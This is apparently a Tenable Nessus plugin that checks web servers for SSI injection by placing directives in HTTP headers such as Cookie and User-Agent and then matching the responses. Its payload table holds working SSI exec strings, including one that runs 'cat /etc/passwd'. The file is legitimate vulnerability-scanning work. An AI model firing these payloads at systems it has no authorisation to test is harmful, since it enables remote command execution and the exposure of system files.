#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(42423);
 script_version("$Revision: 1.21 $");


 script_name(english: "CGI Generic SSI Injection (HTTP headers)");
 script_summary(english: "Tortures the arguments of the remote CGIs (SSI injection)");
 
 script_set_attribute(attribute:"synopsis", value:
"It may be possible to execute arbitrary code through a CGI script
hosted on the remote web server." );
 script_set_attribute(attribute:"description", value:
"The remote web server hosts one or more CGI scripts that fail to
adequately sanitize request strings and seem to be vulnerable to an
'SSI injection' attack.  By leveraging this issue, an attacker may be
able to execute arbitrary commands on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://en.wikipedia.org/wiki/Server_Side_Includes" );
 script_set_attribute(attribute:"see_also", value:"http://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection");
 script_set_attribute(attribute:"see_also", value:"http://projects.webappsec.org/SSI-Injection");
 script_set_attribute(attribute:"solution", value:
"Disable Server Side Includes if you do not use them.

Otherwise, restrict access to the vulnerable application or contact    
the vendor for a patch / upgrade." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cwe_id(
   97,	# Improper Neutralization of Server-Side Includes SSI Within a Web Page
   96,	# Improper Neutralization of Directives in Statically Saved Code 'Static Code Injection'
   94,	# Failure to Control Generation of Code 'Code Injection'
   74,	# Improper Neutralization of Special Elements in Output Used by a Downstream Component 'Injection'
   727,	# OWASP Top Ten 2004 Category A6 - Injection Flaws
   632,	# Weaknesses that Affect Files or Directories
   75,	# Failure to Sanitize Special Elements into a Different Plane Special Element Injection
   752,	# 2009 Top 25 - Risky Resource Management
   713	# OWASP Top Ten 2007 Category A2 - Injection Flaws
 );
 script_set_attribute(attribute:"plugin_publication_date", value:"2009/11/06");
 script_cvs_date("$Date: 2017/01/05 15:28:31 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2009-2017 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("webmirror.nasl", "http_version.nasl", "web_app_test_settings.nasl", "torture_cgi_load_estimation1.nasl");
 script_require_ports("Services/www", 80);
 script_timeout(43200);	# Timeout is managed by the script itself
 script_require_keys("Settings/enable_web_app_tests");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("torture_cgi_headers.inc");
include("url_func.inc");

i = 0;
headers[i++] = "Cookie";
headers[i++] = "User-Agent";
headers[i++] = "Referer";
headers[i++] = "Accept-Language";
headers[i++] = "Accept-Charset";
# To be completed...

####

nosuchfile = strcat("nessus", rand(), ".html");
flaws_and_patterns = make_array(
# Error messages from thttpd and Apache2
'<!--#include file="'+nosuchfile+'"-->',
	"RE:(The filename requested in a include file directive)|(\[an error occurred while processing this directive\])",
'<!--#exec cmd="cat /etc/passwd"-->', "RE:root:.*:0:[01]:",
'<!--#exec cmd="dir"-->',	"ST:<DIR>"
);

####

global_var	unsafe_urls;
global_var	port, flaws_and_patterns;
global_var	headers, stop_at_first_flaw, excluded_RE;

function test(meth, url, postdata, cgi, vul)
{
  local_var	r, i, h, p, rq, prefix, rep;

  url = my_encode(url);
  if (excluded_RE && ereg(string: url, pattern: excluded_RE, icase: 1))
    return -1;
  debug_print(level:3, 'URL=', url, '\n');
  for (h = 0; headers[h]; h ++)
  {
    foreach p (keys(flaws_and_patterns))
    {
      foreach prefix (make_list("", "nessus="))
      {
        if (isnull(postdata))
          rq = http_mk_req(item: url, port:port, method: meth, add_headers: make_array(headers[h], prefix+p));
        else
        {
          rq  = http_mk_req(item: url, port:port, method: meth, data: postdata, add_headers: make_array(headers[h], prefix+p));
        }
        r = http_send_recv_req(req: rq, port:port);
        if(isnull(r))
          return 0;
        rep = extract_pattern_from_resp(pattern: flaws_and_patterns[p], string:r[2]);
        if (strlen(rep) > 0)
	{
          torture_cgi_remember(port: port, url: url, request: http_last_sent_request(), response: r, cgi: cgi, vul: vul);
	  return 1;
        }
      }
    }
  }
  return -1;
}

port = torture_cgi_init(vul:'IH');

rep = run_injection_hdr(vul: "IH", 
  ext_l: make_list("shtml", "stm", "shtm", "htm", "html"));
if (rep) security_hole(port: port, extra: rep);
